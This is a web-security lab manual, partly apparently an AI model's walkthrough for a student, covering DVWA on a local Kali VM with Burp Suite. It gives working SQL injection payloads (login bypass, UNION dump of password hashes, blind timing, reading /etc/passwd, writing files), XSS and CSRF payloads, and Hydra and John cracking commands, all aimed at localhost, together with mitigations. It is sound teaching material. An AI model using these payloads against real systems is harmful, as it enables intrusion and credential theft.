One-time base setup on Kali (no Docker)
Aim
Stand up a local, vulnerable target (DVWA) + Burp Suite on Kali VM only.
System requirements
‚Ä¢	Kali VM (‚â•4 GB RAM, 20‚Äì50 GB disk), Firefox, Burp CE.
‚Ä¢	You‚Äôll run Apache + PHP + MariaDB directly on Kali. 
Experiment 1_merged
Steps (copy-paste in order)
1.	Update & install LAMP + tools
sudo apt update && sudo apt upgrade -y
sudo apt install -y apache2 mariadb-server php php-mysqli php-xml php-gd php-curl php-mbstring git unzip whatweb
sudo systemctl enable --now apache2
sudo systemctl enable --now mariadb
2.	Secure MariaDB & make DVWA DB
sudo mysql_secure_installation    # choose secure answers; set a root pwd
sudo mysql -u root -p -e "CREATE DATABASE dvwa;
CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'DvwaPass123!';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwauser'@'localhost';
FLUSH PRIVILEGES;"
3.	Deploy DVWA to Apache docroot
cd /tmp && git clone https://github.com/digininja/DVWA.git
sudo mv DVWA /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
sudo chmod -R 755 /var/www/html/dvwa
cd /var/www/html/dvwa/config
sudo cp config.inc.php.dist config.inc.php
sudo sed -i "s/\$DB_HOST.*/\$DB_HOST = '127.0.0.1';/" config.inc.php
sudo sed -i "s/\$DB_USER.*/\$DB_USER = 'dvwauser';/" config.inc.php
sudo sed -i "s/\$DB_PASSWORD.*/\$DB_PASSWORD = 'DvwaPass123!';/" config.inc.php
sudo sed -i "s/\$DB_DATABASE.*/\$DB_DATABASE = 'dvwa';/" config.inc.php
sudo systemctl restart apache2



4.	Initialize DVWA
‚Ä¢	Open http://localhost/dvwa/setup.php ‚Üí Create/Reset Database ‚Üí login admin / password ‚Üí set Security = Low for most labs. 
Experiment 1_merged
5.	Wire up Burp (HTTPS interception)
‚Ä¢	Start Burp ‚Üí Proxy listens on 127.0.0.1:8080 ‚Üí In Firefox Settings ‚Üí Network ‚Üí Manual proxy set HTTP/HTTPS to 127.0.0.1:8080 ‚Üí Visit http://burp to install CA cert (trust for websites). You should now see traffic in Proxy ‚ñ∏ HTTP history. 

üîπ EXPERIMENT 1 ‚Äî Validate Lab Environment (Kali + DVWA + Burp)
üéØ Aim
Confirm that the vulnerable web app and Burp proxy are working correctly on Kali Linux.
üìò Theory
Burp Suite acts as a proxy between your browser and the target web app. Intercepting traffic lets you see and modify requests before they reach the server.
________________________________________
‚öôÔ∏è Steps to Perform
1.	Open Firefox inside Kali.
o	Type in the address bar: http://localhost/dvwa
o	Log in with:
o	Username: admin
o	Password: password
o	You should see the DVWA Home page.
2.	Open Burp Suite
o	Applications ‚Üí Web Application Analysis ‚Üí Burp Suite Community Edition
o	When it starts, select Temporary project ‚Üí Use Burp defaults ‚Üí Start Burp
3.	Enable the Proxy
o	In Burp ‚Üí go to Proxy ‚Üí Intercept tab.
o	Ensure the button ‚ÄúIntercept is on‚Äù is highlighted in orange.
4.	Browser Configuration
o	In Firefox ‚Üí Menu ‚Üí Settings ‚Üí
scroll to Network Settings ‚Üí Settings‚Ä¶ ‚Üí Manual proxy configuration
o	HTTP Proxy: 127.0.0.1
o	Port: 8080
o	Check the box ‚ÄúUse this proxy for all protocols‚Äù ‚Üí OK
5.	Capture Traffic
o	Go back to Firefox and refresh the DVWA page.
o	In Burp ‚Üí Proxy ‚Üí HTTP history tab, you should now see requests like /dvwa/login.php.
6.	Disable Intercept (for normal browsing)
o	Click the ‚ÄúIntercept is on‚Äù button once ‚Äî it will change to ‚ÄúIntercept is off‚Äù.
________________________________________
üì∏ Evidence to Capture
‚Ä¢	Screenshot of Burp showing intercepted DVWA traffic (Proxy ‚Üí HTTP history tab)
‚Ä¢	Screenshot of DVWA Home page after login
‚úÖ Expected Result
‚Ä¢	Burp successfully captures all requests.
‚Ä¢	DVWA loads and functions normally.
üß© Conclusion
Your Kali lab environment is correctly configured; you can now test and manipulate traffic using Burp.
________________________________________
üîπ EXPERIMENT 2 ‚Äî Website Crawling Using Burp Spider & Site Map
üéØ Aim
Automatically and manually crawl the DVWA application to identify all available pages, forms, and parameters.
üìò Theory
Crawling (or spidering) helps you discover every endpoint, hidden form, and directory ‚Äî forming the foundation for vulnerability testing.
________________________________________
‚öôÔ∏è Steps to Perform
1.	Ensure Burp Proxy is running and intercept is off.
o	(We want to let traffic pass freely for mapping.)
2.	In Firefox, open DVWA:
o	Navigate through all modules from the left sidebar:
o	Home ‚Üí Instructions ‚Üí Setup ‚Üí Brute Force ‚Üí Command Injection ‚Üí CSRF
o	‚Üí File Inclusion ‚Üí SQL Injection ‚Üí XSS (Reflected) ‚Üí XSS (Stored)
o	As you click through, Burp will collect all these requests.
3.	In Burp:
o	Go to Target ‚Üí Site map.
o	Expand http://localhost.
o	You‚Äôll see a tree structure of all discovered DVWA pages.
4.	(Optional) Right-click the target domain (http://localhost)
‚Üí Select ‚ÄúSpider this host‚Äù (if using Burp Pro).
(In Community Edition, manual browsing works the same way.)
5.	To review the crawl results:
o	Click a file (e.g., /dvwa/vulnerabilities/sqli/) in the Site map.
o	Check Request and Response tabs below to view the raw data.
6.	Export the crawl:
o	Right-click ‚Üí Copy URLs in this host ‚Üí Paste into a text file dvwa_urls.txt.
________________________________________
üì∏ Evidence to Capture
‚Ä¢	Screenshot of Target ‚Üí Site map with expanded /dvwa/ tree
‚Ä¢	Screenshot of the Request/Response pane showing one page‚Äôs details
‚úÖ Expected Result
Burp lists every DVWA module and its parameters.
üß© Conclusion
You‚Äôve successfully mapped the entire attack surface for future experiments.
________________________________________
üîπ EXPERIMENT 3 ‚Äî Using Burp Repeater for Manual Testing
üéØ Aim
Use Burp‚Äôs Repeater tool to manually modify HTTP requests and verify vulnerabilities such as SQL injection.
üìò Theory
Repeater allows you to resend a captured request multiple times with modified parameters ‚Äî useful for confirming vulnerabilities safely.
________________________________________
‚öôÔ∏è Steps to Perform
1.	Go to DVWA ‚Üí SQL Injection (Low) from the left menu.
2.	In the input field labeled ‚ÄúUser ID‚Äù, type 1 ‚Üí Click Submit.
o	You‚Äôll see some user data on the page.
3.	Capture the request:
o	In Burp ‚Üí go to Proxy ‚Üí HTTP history
o	Find the request to /dvwa/vulnerabilities/sqli/
o	Right-click that request ‚Üí Send to Repeater
4.	Open the Repeater Tab:
o	Click Repeater (top bar)
o	You‚Äôll see the raw HTTP request on the left and the response on the right.
5.	Test a normal query:
o	Click Send
o	Note the HTTP status (200 OK) and response body.
6.	Now inject a payload:
o	In the request body or URL parameter (after id=), change:
o	id=1
to
id=1' OR '1'='1
o	Click Send
o	Observe the difference in response (e.g., more data or error).
7.	Document findings:
o	Copy both responses to a text file for evidence.
________________________________________
üì∏ Evidence to Capture
‚Ä¢	Screenshot of the Repeater tab showing request and response (before and after payload)
‚Ä¢	Highlight where the payload is injected
‚úÖ Expected Result
The second response reveals different data, confirming SQLi vulnerability.
üß© Conclusion
Burp Repeater can precisely confirm vulnerabilities by comparing server responses to controlled input changes.


________________________________________
üß© EXPERIMENT 4 ‚Äî Target Identification & Tech-Stack Fingerprinting
üéØ Aim
Identify what technologies, versions, and headers the web application is running.
üìò Theory
Every web server leaks small clues ‚Äî response headers, CMS signatures, and open ports. These help analysts understand possible vulnerabilities (e.g., outdated Apache, PHP).
________________________________________
‚öôÔ∏è Steps to Perform
üñ•Ô∏è Using Firefox
1.	Open http://localhost/dvwa
2.	Press F12 ‚Üí Network tab ‚Üí refresh the page.
3.	Click the first entry (e.g., index.php) ‚Üí under Headers, note:
o	Server: (usually Apache/2.x)
o	X-Powered-By: (PHP/8.x)
o	Content-Type:
Screenshot these headers.
üíª Using Terminal
4.	Open a new terminal and run:
5.	curl -I http://localhost/dvwa
‚Üí This prints the raw response headers.
6.	Run a fingerprinting scan:
7.	whatweb http://localhost/dvwa
It should report something like:
Apache[2.4.57], PHP[8.2.10], HTML5, Cookies
üß∞ Using Burp
6.	In Burp ‚Üí Proxy ‚Üí HTTP history, click the /dvwa/index.php request.
7.	Under Response, switch to the Headers tab.
Note the same header information there.
________________________________________
üì∏ Evidence
‚Ä¢	Screenshot of Firefox Network Headers
‚Ä¢	Screenshot of Burp Response Headers
‚Ä¢	curl / whatweb command outputs saved in a text file
‚úÖ Expected Result
You should identify that the app runs Apache + PHP on localhost with default modules.
üß© Conclusion
Header analysis and fingerprinting successfully revealed the stack details that would guide deeper tests (e.g., outdated modules, default configs).
________________________________________
üß© EXPERIMENT 5 ‚Äî Passive Reconnaissance / OSINT (For Authorized Domains)
üîê This lab shows the tools ‚Äî only use them on domains you own or are permitted to test.
üéØ Aim
Perform passive reconnaissance using DNS, WHOIS, and public certificate data.
üìò Theory
Passive OSINT collects information without sending direct attacks ‚Äî purely observation of public data sources.
________________________________________
‚öôÔ∏è Steps
üñ•Ô∏è In Terminal
1.	Create a folder to save recon data:
2.	mkdir ~/osint_lab && cd ~/osint_lab
3.	Check DNS records:
4.	dig example.com any +noall +answer > dns.txt
5.	View domain registration:
6.	whois example.com > whois.txt
7.	Find technologies in use:
8.	whatweb https://example.com > tech.txt
9.	Open browser ‚Üí visit
https://crt.sh/ ‚Üí search for %25.example.com
Save the certificate list as screenshot.
üìä Review
6.	Open each text file in cat or less and note:
o	IP addresses
o	Name servers
o	Technologies (Apache, Cloudflare, etc.)
________________________________________
üì∏ Evidence
‚Ä¢	Screenshots of terminal commands
‚Ä¢	crt.sh results page
‚úÖ Expected Result
Public information about the selected authorized domain is gathered and documented.
üß© Conclusion
Passive OSINT identified domain footprint without interacting directly with servers.
________________________________________
üß© EXPERIMENT 6 ‚Äî Session-Management Vulnerabilities
üéØ Aim
Test how DVWA handles session IDs, fixation, cookie flags, logout, and timeout.
üìò Theory
A session cookie (PHPSESSID) authenticates a user. Weaknesses (no regeneration, missing HttpOnly/Secure) allow hijacking.
________________________________________
‚öôÔ∏è Steps
1Ô∏è‚É£ Check Session Cookie Attributes
1.	In Firefox, log in to DVWA (admin/password).
2.	Press F12 ‚Üí Storage ‚Üí Cookies ‚Üí select http://localhost.
o	Find PHPSESSID
o	Observe if columns HttpOnly, Secure, or SameSite are set (usually they‚Äôre blank).
o	Take a screenshot.
3.	In Burp ‚Üí Proxy ‚Üí HTTP history, click a logged-in request.
o	Under Response Headers, find Set-Cookie: and note its flags.
2Ô∏è‚É£ Test Session Fixation
4.	Logout from DVWA.
5.	In Burp ‚Üí Proxy ‚Üí Intercept is on, visit any DVWA page (before login).
o	Right-click request ‚Üí Do Intercept ‚Üí Response to this request.
o	In the Request pane, add header manually:
o	Cookie: PHPSESSID=testfixation
o	Forward the request until login page appears.
6.	Now log in normally (admin/password).
7.	In Firefox Storage ‚Üí Cookies, check if the PHPSESSID value is still testfixation.
o	If yes ‚Üí session fixation vulnerability exists.
3Ô∏è‚É£ Test Logout & Timeout
8.	Click Logout on DVWA left menu.
9.	Try pressing the Back button or re-entering a previously copied /vulnerabilities/sqli/ URL.
o	If page loads without relogin, logout didn‚Äôt invalidate session.
10.	Wait 15 minutes idle, then reload a page ‚Äî if still logged in, there‚Äôs no idle timeout.
________________________________________
üì∏ Evidence
‚Ä¢	Screenshots of cookie flags
‚Ä¢	Screenshot proving same PHPSESSID before/after login
‚Ä¢	Screenshot showing page access after logout
‚úÖ Expected Result
DVWA‚Äôs low-security mode will show missing flags, no regeneration, and insecure logout.
üß© Conclusion
Observed weak session handling. Secure fix ‚Üí regenerate ID after login (session_regenerate_id(true);) and set cookies with:
HttpOnly; Secure; SameSite=Lax
________________________________________
üß© EXPERIMENT 7 ‚Äî Brute-Force Attack on Login Page
üéØ Aim
Demonstrate how repeated login attempts with a password list can break weak credentials.
üìò Theory
Brute force testing automates login attempts. DVWA‚Äôs Brute Force module illustrates rate-limit and weak-password issues.
________________________________________
‚öôÔ∏è Steps
üîπ Inside DVWA
1.	From left menu choose ‚ÄúBrute Force‚Äù.
2.	In the form fields:
o	Username ‚Üí admin
o	Password ‚Üí try a wrong password like 1234
o	Click Login
o	Observe message ‚ÄúUsername and/or password incorrect.‚Äù
üîπ Capture the Request
3.	Open Burp ‚Üí Proxy ‚Üí HTTP history.
o	Click the /vulnerabilities/brute/ request.
o	Confirm the method = POST and see parameters:
o	username=admin&password=1234&Login=Login
o	Note that failure text contains incorrect ‚Äî we‚Äôll use it as our fail-string.
üîπ Run Hydra from Kali Terminal
4.	In terminal, execute:
5.	hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
üß† Breakdown
-l admin ‚Üí username
-P ‚Üí wordlist path
URL path ‚Üí endpoint
F=incorrect ‚Üí failure condition
6.	Let Hydra run a few seconds; it should find:
7.	[80][http-post-form] host: 127.0.0.1   login: admin   password: password
8.	Press Ctrl +C to stop after success.
________________________________________
üì∏ Evidence
‚Ä¢	Screenshot of Burp HTTP history showing POST request
‚Ä¢	Screenshot of Hydra output with cracked credentials
‚úÖ Expected Result
Hydra successfully finds the valid password (‚Äúpassword‚Äù) for user admin.
üß© Conclusion
DVWA‚Äôs login form is vulnerable to brute-force because it lacks rate-limiting and account lockout.
Mitigation: Add CAPTCHA, exponential back-off, and multi-factor authentication.
________________________________________
As per esep list



You got it, Aditya. Below is a from-zero, click-by-click walkthrough for every experiment in your PDF ‚Äî exactly what to open, where to click, what to type, and how to verify the output on your Kali VM with DVWA + Burp. I‚Äôve matched each item to your PDF list. 
________________________________________
0) Before you start (quick sanity checks)
‚Ä¢	Open Firefox ‚Üí go to http://localhost/dvwa ‚Üí Login: admin / password.
‚Ä¢	Open Burp Suite ‚Üí Temporary project ‚Üí Start Burp.
‚Ä¢	In Firefox: Settings ‚Üí Network ‚Üí Manual proxy ‚Üí HTTP & HTTPS proxy 127.0.0.1, port 8080.
‚Ä¢	In Burp ‚Üí Proxy ‚Üí Intercept: click until it shows Intercept is off (so you can browse smoothly).
(We‚Äôll enable Intercept only when needed.) 
________________________________________
1) Crawl with Burp Spider / Site Map
PDF: Identify and Manage vulnerabilities by Crawling the web application using Burp Spider/Site Map 
Steps
1.	Firefox ‚Üí http://localhost/dvwa (through Burp).
2.	In DVWA left menu, click through every item one by one:
o	Home ‚Üí Instructions ‚Üí Setup ‚Üí Brute Force ‚Üí Command Injection ‚Üí CSRF ‚Üí File Inclusion ‚Üí File Upload ‚Üí SQL Injection ‚Üí XSS (Reflected) ‚Üí XSS (Stored), etc.
3.	Burp ‚Üí Target ‚Üí Site map ‚Üí expand http://localhost ‚Üí expand /dvwa/.
4.	Right-click the host ‚Üí Copy URLs in this host ‚Üí paste into a text file dvwa_urls.txt.
5.	Click a specific path (e.g., /dvwa/vulnerabilities/sqli/) ‚Üí bottom pane Request/Response to review details.
Output to check
‚Ä¢	Site map tree shows all DVWA endpoints with parameters.
‚Ä¢	dvwa_urls.txt contains the URLs you just copied.
(Take a screenshot of Site map with /dvwa/ expanded.) 
________________________________________
2) Replaying requests with Repeater
PDF: Identify and Manage vulnerabilities by Replaying web requests using the Repeater tab. 
Steps
1.	DVWA ‚Üí SQL Injection ‚Üí in ‚ÄúUser ID‚Äù type 1 ‚Üí Submit.
2.	Burp ‚Üí Proxy ‚Üí HTTP history ‚Üí click the request to /dvwa/vulnerabilities/sqli/.
3.	Right-click ‚Üí Send to Repeater.
4.	Go to Repeater tab ‚Üí click Send (baseline).
5.	In the request (look for id=1), change to:
6.	id=1' OR '1'='1
‚Üí click Send again.
7.	Compare the Response pane (status/body/length) for behavior change.
Output to check
‚Ä¢	Response difference (e.g., extra rows, error banners) proves parameter is injectable.
(Screenshot Repeater with the modified request and the changed response.) 
________________________________________
3) Identify target tech stack, URLs, endpoints
PDF: Identify the target web application and gather relevant information‚Ä¶ technology stack, URLs, endpoints‚Ä¶ 
Steps
In Firefox DevTools
1.	Press F12 ‚Üí Network tab ‚Üí refresh DVWA.
2.	Click index.php ‚Üí Headers: note Server, X-Powered-By, Content-Type. Take a screenshot.
In Burp
3) Proxy ‚Üí HTTP history ‚Üí click DVWA responses ‚Üí check Response ‚Üí Headers for the same data.
In Terminal
4) Run:
curl -I http://localhost/dvwa
whatweb http://localhost/dvwa
Save outputs to tech.txt.
Output to check
‚Ä¢	You can list: Apache version, PHP version, key headers, and main URLs (from Step #1). 
________________________________________
4) OSINT (only for authorized external domains)
PDF: Use OSINT techniques‚Ä¶ 
Steps (example with example.com)
1.	Terminal:
2.	mkdir -p ~/osint && cd ~/osint
3.	dig example.com any +noall +answer > dns.txt
4.	whois example.com > whois.txt
5.	whatweb https://example.com > tech.txt
6.	Browser ‚Üí open https://crt.sh ‚Üí search %25.example.com ‚Üí screenshot results.
Output to check
‚Ä¢	dns.txt, whois.txt, tech.txt, and a screenshot of crt.sh results. 
________________________________________
5) Session Management Vulnerabilities (Mutillidae/DVWA)
PDF: Identify Session Management Vulnerabilities in Mutillidae/DVWA 
Steps
1.	DVWA ‚Üí Login.
2.	Firefox ‚Üí F12 ‚Üí Storage ‚Üí Cookies ‚Üí http://localhost ‚Üí click PHPSESSID.
o	Check columns: HttpOnly, Secure, SameSite (often blank at Low). Screenshot.
3.	Burp ‚Üí Proxy ‚Üí HTTP history ‚Üí open the login response ‚Üí Response ‚Üí Headers ‚Üí view Set-Cookie flags; screenshot.
4.	Session fixation:
o	DVWA Logout.
o	Burp ‚Üí Proxy ‚Üí Intercept is on.
o	Visit any DVWA page; in Request add header:
o	Cookie: PHPSESSID=testfix
‚Üí Forward to login page.
o	Now login normally. Firefox Storage ‚Üí Cookies: confirm PHPSESSID equals testfix. If yes ‚Üí fixation.
5.	Logout test: DVWA Logout, then press Back or reuse a captured authenticated URL; if it opens, logout is weak.
6.	Idle timeout: leave tab idle 15 minutes; refresh; if still logged in, no idle timeout.
Output to check
‚Ä¢	Screenshots: cookie flags, fixation persistence, post-logout access. 
________________________________________
6) Brute-forcing authentication
PDF: Identify Brute forcing the authentication of Mutillidae/DVWA 
Steps
1.	DVWA ‚Üí Brute Force page. Enter admin / wrong password 1234 ‚Üí Login.
2.	Burp ‚Üí Proxy ‚Üí HTTP history ‚Üí click the POST to /vulnerabilities/brute/.
o	Note form fields (e.g., username, password, Login).
o	Note failure text (e.g., contains ‚Äúincorrect‚Äù).
3.	Terminal (Hydra attack against local):
4.	hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
5.	Watch for success line (e.g., login: admin password: password).
Output to check
‚Ä¢	Burp screenshot of the login POST.
‚Ä¢	Terminal screenshot showing Hydra success (username/password). 
________________________________________
7) Detecting XSS (Reflected & Stored)
PDF: Detecting XSS Vulnerabilities‚Ä¶ Perform reflected XSS attack and stored XSS attack 
Reflected XSS (DVWA)
1.	DVWA ‚Üí XSS (Reflected).
2.	In the input, enter:
3.	<script>alert('XSS')</script>
‚Üí Submit.
4.	An alert pops up. Screenshot with alert visible.
Stored XSS (DVWA)
4.	DVWA ‚Üí XSS (Stored).
5.	In Message/Comment field enter:
6.	<script>alert('STORED')</script>
‚Üí Sign/Submit.
7.	Open the page/list where your message displays; alert should pop. Screenshot.
Output to check
‚Ä¢	Two screenshots: Reflected alert; Stored alert.
‚Ä¢	Burp saved request(s) (right-click ‚Üí Save item) showing your payload. 
________________________________________
8) Detect CSRF + Prevent via JavaScript (double-submit) + Detect via Burp
PDF: Detecting CSRF Vulnerabilities‚Ä¶ Prevent CSRF using JavaScript; Detect CSRF using Burp Suite 
Detect CSRF (exploit)
1.	DVWA ‚Üí CSRF page (action like change password).
2.	Burp ‚Üí Proxy ‚Üí HTTP history ‚Üí click that POST ‚Üí note fields (e.g., password_new, password_conf).
3.	Create a local file csrf_attack.html with:
4.	<form action="http://localhost/dvwa/vulnerabilities/csrf/" method="POST">
5.	  <input type="hidden" name="password_new" value="hacked123">
6.	  <input type="hidden" name="password_conf" value="hacked123">
7.	  <input type="submit" value="Do CSRF">
8.	</form>
9.	In Firefox (same logged-in session): File ‚Üí Open File ‚Üí open csrf_attack.html ‚Üí Do CSRF.
10.	If password changes, DVWA is vulnerable. Screenshot result + Burp request.
Prevent CSRF using JavaScript (double-submit cookie)
(Quick lab patch ‚Äî you can revert later.)
1.	Edit /var/www/html/dvwa/vulnerabilities/csrf/csrf.php and add:
o	Script to set csrf_ds_token cookie and add hidden form field on submit (as given earlier).
o	PHP check:
o	if($_SERVER['REQUEST_METHOD']==='POST'){
o	  $c=$_COOKIE['csrf_ds_token']??''; $p=$_POST['csrf_ds_token']??'';
o	  if(empty($c)||empty($p)||!hash_equals($c,$p)){ echo "<h3 style='color:red'>Invalid CSRF token</h3>"; exit; }
o	}
2.	Restart Apache if needed: sudo systemctl restart apache2.
3.	Repeat the attack from csrf_attack.html (with no cookie). Expect rejection message.
4.	In Burp, confirm Cookie header has csrf_ds_token and POST body has csrf_ds_token when using the legitimate DVWA form.
Detect using Burp
‚Ä¢	Burp ‚Üí Proxy ‚Üí HTTP history ‚Üí compare legit form (has token cookie + hidden field) vs malicious HTML (no/mismatched token). Save both.
Output to check
‚Ä¢	Pre-mitigation: attack succeeds.
‚Ä¢	Post-mitigation: server shows ‚ÄúInvalid CSRF token‚Äù.
‚Ä¢	Burp screenshots showing token presence/absence. 
________________________________________
9) SQLi: Bypass Authentication
PDF: Examine SQL Injection: Bypassing Authentication using SQL injection 
Steps (login form)
1.	DVWA Login page ‚Üí Username: admin; Password:
2.	' OR '1'='1' --
‚Üí Login.
3.	If it logs in, bypass worked. Screenshot logged-in page.
4.	Burp ‚Üí HTTP history ‚Üí save the POST showing injected password.
Output to check
‚Ä¢	Successful login without correct password (screenshot + saved request). 
________________________________________
10) SQLi: Extract data via UNION
PDF: Examine SQL Injection: Extracting Data using the UNION attack 
Steps (DVWA SQL Injection page)
1.	In ‚ÄúUser ID‚Äù, find column count:
2.	1' ORDER BY 1-- -
3.	1' ORDER BY 2-- -
4.	1' ORDER BY 3-- -
Note the highest that works (say it‚Äôs 2).
5.	Try UNION:
6.	1' UNION SELECT user, password FROM users -- -
‚Üí Submit.
7.	If output shows usernames & hashes, copy them into hashes.txt.
Output to check
‚Ä¢	Page displays DB users/hashes (screenshot).
‚Ä¢	hashes.txt saved. 
________________________________________
11) SQLi: Blind (Boolean/Time-based)
PDF: Examine SQL Injection: Blind SQL injection 
Steps (time-based example)
1.	In ‚ÄúUser ID‚Äù:
2.	1' AND IF(1=1, SLEEP(5), 0) -- -
‚Üí Submit (page delays ~5s).
3.	Try char test (first char of first user‚Äôs password equals ‚Äòa‚Äô):
4.	1' AND IF(SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) -- -
5.	Burp ‚Üí HTTP history ‚Üí check Response time column for 5s requests. Screenshot.
Output to check
‚Ä¢	Noticeable delay indicates TRUE branch executed ‚Üí blind SQLi proven. 
________________________________________
12) Extended SQLi: Read DB Password Hashes & Crack
PDF: Extended SQLi‚Ä¶ Reading Database Password Hashes 
Steps
1.	Use UNION from #10 to dump user,password. Save to ~/hashes.txt (one per line).
2.	Terminal (on Kali):
3.	john --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes.txt
4.	john --show ~/hashes.txt
5.	Save output to john_output.txt.
Output to check
‚Ä¢	john prints recovered plaintexts. Screenshot + save to file. 
________________________________________
13) Extended SQLi: Protecting against SQLi
PDF: Extended SQLi‚Ä¶ Protecting against SQL injection 
Steps (prove fix)
1.	Edit a vulnerable PHP query (DVWA sample page used in #10). Replace concatenation with prepared statements (PDO/MySQLi). Example (PDO):
2.	$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
3.	$stmt->execute([$_GET['id']]);
4.	Restart Apache if needed.
5.	Re-run payloads from #10/#11 ‚Üí they should no longer work (no extra rows or delay).
6.	Screenshot before/after behavior.
Output to check
‚Ä¢	Attacks are inert after fix; screenshots show same input now harmless. 
________________________________________
14) Extended SQLi: Read files from the server (safe demonstration)
PDF: Extended SQLi‚Ä¶ Reading Files from the Target Web Server 
Only on your VM. Some DVWA configs won‚Äôt allow this; that‚Äôs OK ‚Äî capturing the DB error still proves attempted vector.
Steps
1.	In ‚ÄúUser ID‚Äù, try:
2.	1' UNION SELECT LOAD_FILE('/etc/passwd'), NULL -- -
(Adjust column count with NULLs.)
3.	If allowed, the page prints file text; otherwise you‚Äôll see an error about permissions/secure_file_priv. Screenshot either result.
Output to check
‚Ä¢	Proof of read (content dump) or DB error message proving the attempt vector. 
________________________________________
15) Extended SQLi: Write files to the server (safe, benign HTML + rollback)
PDF: Extended SQLi‚Ä¶ Writing Files into the Target Web Server 
Take a VM snapshot first. Write a benign HTML file only.
Steps
1.	Determine column count (#10).
2.	Try writing a benign file to webroot:
3.	1' UNION SELECT '<html><body><h1>SQLi test</h1></body></html>', NULL INTO OUTFILE '/var/www/html/dvwa/sqli_test.html' -- -
(Pad with NULL for your column count.)
4.	If DB blocks it with secure_file_priv, write to that directory (e.g., /var/lib/mysql-files/) then move with:
5.	sudo mv /var/lib/mysql-files/sqli_test.html /var/www/html/dvwa/sqli_test.html
6.	Verify in browser: http://localhost/dvwa/sqli_test.html (screenshot).
7.	Cleanup:
8.	sudo rm -f /var/www/html/dvwa/sqli_test.html
(Or revert snapshot.)
Output to check
‚Ä¢	Burp Repeater screenshot with payload.
‚Ä¢	Browser screenshot showing the HTML page.
‚Ä¢	Cleanup confirmation. 
________________________________________
16) (Optional) CSRF detection using only Burp
PDF: Detecting CSRF‚Ä¶ Detect CSRF attack using Burp Suite 
Steps
1.	Legit action: DVWA CSRF form ‚Üí submit ‚Üí Burp HTTP history ‚Üí save the POST (right-click ‚Üí Save item).
2.	In Proxy ‚Üí HTTP history, right-click the legit POST ‚Üí Send to Repeater.
3.	In Repeater, remove any anti-CSRF token parameter (if present) ‚Üí Send.
4.	If server still accepts ‚Üí vulnerable; if it rejects ‚Üí protection present. Screenshot the response.
Output to check
‚Ä¢	Repeater result: accepted (vulnerable) vs rejected (protected). 
________________________________________
Evidence checklist (what to submit)
Create ~/awx_lab_evidence/ and save:
‚Ä¢	Crawl: Site map screenshot + dvwa_urls.txt.
‚Ä¢	Repeater: before/after response screenshots.
‚Ä¢	Tech stack: Firefox Headers screenshot + tech.txt.
‚Ä¢	OSINT: dns.txt, whois.txt, tech.txt, crt.sh screenshot.
‚Ä¢	Session: cookie flags, fixation before/after, logout/timeout screenshots.
‚Ä¢	Brute force: Burp POST + Hydra success screenshot.
‚Ä¢	XSS: Reflected & Stored alert screenshots + saved Burp requests.
‚Ä¢	CSRF: attack success, JS-mitigation rejection, Burp token comparison screenshots.
‚Ä¢	SQLi: auth bypass screenshot; UNION dump + hashes.txt; blind timing screenshot; john_output.txt.
‚Ä¢	Extended SQLi: LOAD_FILE result/error screenshot; sqli_test.html page + cleanup proof. 
________________________________________
If you want, I can package these steps as printable 1-page checklists per experiment (so you can keep one tab open and tick them off during your lab).

